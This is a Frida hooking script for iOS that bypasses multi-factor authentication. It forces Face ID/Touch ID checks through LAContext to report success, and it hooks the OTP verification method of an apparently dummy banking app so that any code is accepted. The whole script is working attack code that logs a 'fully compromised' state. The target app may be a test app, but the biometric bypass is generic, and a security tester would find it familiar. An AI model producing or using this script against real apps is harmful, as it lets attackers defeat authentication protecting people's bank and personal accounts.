/**
 * Sentinel Hook - Phase 10.2 (MFA Chain Bypass)
 * FIXED: canEvaluatePolicy hook added, reply block called in onEnter,
 *        OTP verifyOTP hook with forced true return.
 */

if (ObjC.available) {
    console.log("[🌟] SENTINEL SUBSYSTEM: Initiating MFA Chain Override (Phase 10.2)");
    
    // == STEP 1: Biometric Hook ==
    var LAContext = ObjC.classes.LAContext;
    try {
        // Force canEvaluatePolicy → YES even on simulator
        Interceptor.attach(LAContext["- canEvaluatePolicy:error:"].implementation, {
            onLeave: function (retval) {
                retval.replace(1);
            }
        });

        // Fire success block immediately in onEnter before OS can reject
        Interceptor.attach(LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
            onEnter: function (args) {
                console.log("[💥] CHAIN LINK 1 (Biometric): Intercepted. Forcing success...");
                var replyBlock = new ObjC.Block(args[4]);
                try {
                    replyBlock.implementation(1, null);
                    console.log("[+] CHAIN LINK 1 (Biometric): ACCESS GRANTED.");
                } catch (e) {
                    console.log("[-] Block exec error: " + e.message);
                }
            }
        });
    } catch(err) {
        console.log("[-] ERROR: Chain Link 1 failed - " + err.message);
    }
    
    // == STEP 2: OTP Hook ==
    var targetMFA = "_TtC9DummyBank14MFAAuthManager";
    try {
        var AppMFAManager = ObjC.classes[targetMFA];
        if (AppMFAManager) {
            console.log("[+] TARGET LOCKED: " + targetMFA + " — waiting for OTP trigger...");
            
            Interceptor.attach(AppMFAManager["- verifyOTPWithCode:"].implementation, {
                onEnter: function(args) {
                    console.log("[💥] CHAIN LINK 2 (OTP): Intercepting verification call...");
                    var godKey = ObjC.classes.NSString.stringWithString_("SENTINEL_OVERRIDE");
                    args[2] = godKey;
                    console.log("    -> God-Key injected: SENTINEL_OVERRIDE");
                },
                onLeave: function(retval) {
                    retval.replace(1); // Force return true
                    console.log("[✅] CHAIN LINK 2 (OTP): FORCED. SYSTEM FULLY COMPROMISED.");
                }
            });
        } else {
            console.log("[-] MFA class not found in memory yet. Ensure MFA Target E is open.");
        }
    } catch (err) {
        console.log("[-] ERROR: Chain Link 2 failed - " + err.message);
    }
} else {
    console.log("[-] FATAL: Objective-C Runtime unavailable.");
}
